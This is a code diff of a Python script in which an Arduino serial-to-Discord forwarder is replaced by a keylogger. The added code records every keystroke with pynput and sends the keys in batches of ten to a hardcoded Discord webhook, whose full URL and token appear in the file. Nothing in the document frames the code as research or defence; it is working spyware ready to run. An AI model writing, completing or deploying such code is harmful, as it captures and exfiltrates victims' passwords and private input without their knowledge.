@@ -1,25 +1,14 @@
-import serial
-import time
 import requests
 import logging
+from pynput import keyboard
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
 
-# Setup the serial connection
-arduino_port = 'COM10'  # Replace with the correct COM port for your Arduino
-baud_rate = 9600
-try:
-    ser = serial.Serial(arduino_port, baud_rate, timeout=1)
-    logging.info("Serial connection established.")
-except serial.SerialException as e:
-    logging.error(f"Error opening serial connection: {e}")
-    exit(1)
-
 # Replace with your Discord webhook URL
 webhook_url = "https://discord.com/api/webhooks/1314598947494301766/9e3u1FROKR8Uxfol8WgghR9w6HU7P1Ngkx6hKhPx1_2mynJSMGAcls5yVgIbZgazs1Jw"
 
-
+# Function to send data to Discord
 def send_to_discord(data):
     payload = {"content": data}
     try:
@@ -29,23 +18,32 @@ def send_to_discord(data):
     except requests.exceptions.RequestException as e:
         logging.error(f"Error sending data to Discord: {e}")
 
-# Main loop
-try:
-    while True:
-        if ser.in_waiting > 0:
-            try:
-                data = ser.readline().decode('utf-8').strip()
-                if data:
-                    logging.info(f"Received data from Arduino: {data}")
-                    send_to_discord(data)
-            except UnicodeDecodeError:
-                logging.warning("Error decoding serial data. Skipping invalid data.")
+# Function to log keystrokes and send them to Discord
+def keylogger_to_discord():
+    keys_buffer = []  # Buffer to store key logs
 
-        time.sleep(1)
+    def on_press(key):
+        try:
+            # Convert key to readable format
+            keys_buffer.append(key.char)
+        except AttributeError:
+            # Handle special keys (e.g., Shift, Ctrl)
+            keys_buffer.append(f"[{key.name}]")
 
-except KeyboardInterrupt:
-    logging.info("Program terminated by user.")
-finally:
-    if ser.is_open:
-        ser.close()
-        logging.info("Serial connection closed.")
+        # Send the buffer to Discord if it reaches a threshold
+        if len(keys_buffer) >= 10:  # Adjust threshold as needed
+            data_to_send = ''.join(keys_buffer)
+            send_to_discord(data_to_send)
+            keys_buffer.clear()  # Clear the buffer after sending
+
+    # Listener for key press events
+    with keyboard.Listener(on_press=on_press) as listener:
+        logging.info("Keylogger started. Press Ctrl+C to stop.")
+        try:
+            listener.join()
+        except KeyboardInterrupt:
+            logging.info("Keylogger stopped.")
+
+# Start the keylogger
+if __name__ == "__main__":
+    keylogger_to_discord()
